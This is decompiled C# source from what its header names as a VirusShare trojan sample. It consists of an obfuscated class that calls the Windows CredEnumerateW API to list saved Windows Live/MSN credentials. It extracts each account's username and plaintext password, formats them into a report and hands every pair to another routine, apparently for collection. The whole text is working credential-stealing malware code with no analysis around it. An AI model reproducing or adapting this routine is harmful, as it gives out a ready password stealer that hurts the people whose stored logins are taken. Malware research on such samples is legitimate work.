// Decompiled with JetBrains decompiler
// Type: adfND.TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV
// Assembly: adfND, Version=2.1.3.4, Culture=neutral, PublicKeyToken=null
// MVID: B39AC443-093C-4412-BE50-149A7E6ADFED
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Downloader.MSIL.Crypted.cd-b42cf5dc593d9380920439dace615ab045e5dfbae25773d3b63b45980d1d1942.exe

using adfND.My;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace adfND
{
  public class TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV
  {
    [DebuggerNonUserCode]
    public TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV()
    {
    }

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CredEnumerateW(
      string filter,
      uint flag,
      out uint count,
      out IntPtr pCredentials);

    public static string ZXt30g8cu7yvdJV9ndF1CY()
    {
      string str1 = "";
      IntPtr pCredentials = IntPtr.Zero;
      uint count;
      if (!TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV.CredEnumerateW("WindowsLive:name=*", 0U, out count, out pCredentials))
        return (string) null;
      string str2 = str1 + "Result: " + count.ToString() + " Msn's found\r\n\r\n";
      int num1 = checked ((int) ((long) count - 1L));
      int num2 = 0;
      while (num2 <= num1)
      {
        string u = (string) null;
        TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV.CREDENTIAL structure = (TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV.CREDENTIAL) Marshal.PtrToStructure(Marshal.ReadIntPtr(pCredentials, checked (IntPtr.Size * num2)), typeof (TfvLgUdBvZbIbhpeKTUSXuCJmzyPTVNmCteMOjMQeaJXvwXgsV.CREDENTIAL));
        string str3 = str2 + "Msn: " + structure.UserName + "\r\n";
        string l = structure.UserName + "\r\n";
        Marshal.PtrToStringBSTR(structure.CredentialBlob);
        str2 = str3 + "Password: " + Marshal.PtrToStringBSTR(structure.CredentialBlob) + "\r\n\r\n";
        string pa = Marshal.PtrToStringBSTR(structure.CredentialBlob) + "\r\n";
        MyProject.Forms.UNNamOqklECJPYk.pPFBUwSOdPVCdM2k(8, u, l, pa);
        checked { ++num2; }
      }
      return str2;
    }

    internal struct CREDENTIAL
    {
      public int Flags;
      public int Type;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string TargetName;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string Comment;
      public long LastWritten;
      public int CredentialBlobSize;
      public IntPtr CredentialBlob;
      public int Persist;
      public int AttributeCount;
      public IntPtr Attributes;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string TargetAlias;
      [MarshalAs(UnmanagedType.LPWStr)]
      public string UserName;
    }
  }
}
